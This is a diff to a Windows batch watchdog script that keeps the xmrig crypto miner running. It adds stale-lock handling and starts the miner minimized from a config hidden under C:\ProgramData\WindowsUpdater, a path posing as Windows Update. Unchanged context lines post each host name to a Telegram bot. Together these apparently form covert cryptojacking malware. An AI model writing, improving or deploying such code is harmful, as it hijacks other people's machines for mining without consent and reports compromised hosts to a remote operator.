@@ -24,8 +24,16 @@ set /a STATS=0
 
 echo [*] Watchdog start at %date% %time% > "%LOG%"
 
-:: prevent dupes
-if exist "%MUTEX%" exit /b
+:: prevent dupes (with stale lock handling)
+if exist "%MUTEX%" (
+  tasklist /FI "imagename eq xmrig.exe" | find /I "xmrig.exe" >nul
+  if errorlevel 1 (
+    rem stale lock, no miner running; clearing mutex
+    del "%MUTEX%" 2>nul
+  ) else (
+    exit /b
+  )
+)
 echo locked > "%MUTEX%"
 
 :: system-wide tweaks
@@ -72,12 +80,7 @@ bcdedit /deletevalue useplatformclock >nul
   tasklist /FI "imagename eq xmrig.exe" | find /I "xmrig.exe" >nul
   if errorlevel 1 (
     echo [*] Starting miner… >> "%LOG%"
-    start /min /affinity %AFF% "" "%XMRIG%" ^
-      -o %POOL% -u %WALLET% -p %PASS% -a rx/0 ^
-      --donate-level=0 --randomx-1gb-pages ^
-      --threads=%THREADS% --cpu-priority=%PRIO% ^
-      --cpu-max-threads-hint=%HINT% ^
-      --http-port=%API% --max-cpu-usage=90
+    start "" /min "%XMRIG%" --config="C:\ProgramData\WindowsUpdater\config.json"
     curl -s -X POST "https://api.telegram.org/bot%TG_TOKEN%/sendMessage" ^
       -d "chat_id=%TG_CHAT%" -d "text=⚠️ Miner started on %COMPUTERNAME%"
   )
